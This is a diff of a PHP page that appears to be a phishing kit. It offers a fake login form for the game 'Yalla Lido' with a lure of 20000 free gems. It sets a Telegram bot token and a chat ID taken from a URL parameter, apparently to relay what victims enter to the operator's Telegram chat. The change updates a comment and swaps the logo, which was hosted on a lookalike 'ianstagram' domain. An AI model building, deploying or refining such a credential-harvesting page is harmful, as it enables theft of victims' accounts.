@@ -1,5 +1,5 @@
 <?php
-// توكن البوت الخاص بك
+// توكن البوت الخاص بك (تم تحديثه)
 $botToken = "BBOTTTTTTTTTTT";
 
 // دالة لإرسال الرسائل إلى التليجرام
@@ -397,7 +397,8 @@ $chatId = isset($_GET['ID']) ? $_GET['ID'] : '8107714468';
         
         <div class="login-form">
             <div class="logo-container">
-                <img src="https://dev-ianstagram.pantheonsite.io/wp-content/uploads/2025/08/Screenshot_20250826_124852_Google.jpg" alt="Yalla Lido Logo">
+                <!-- الشعار الجديد -->
+                <img src="https://i.ibb.co/Dgp7Qxh6/Screenshot-20260411-001354-Google.jpg" alt="Yalla Lido Logo">
                 <p>سجل الدخول إلى حسابك واربح 20000 جوهرة مجانًا</p>
             </div>
             
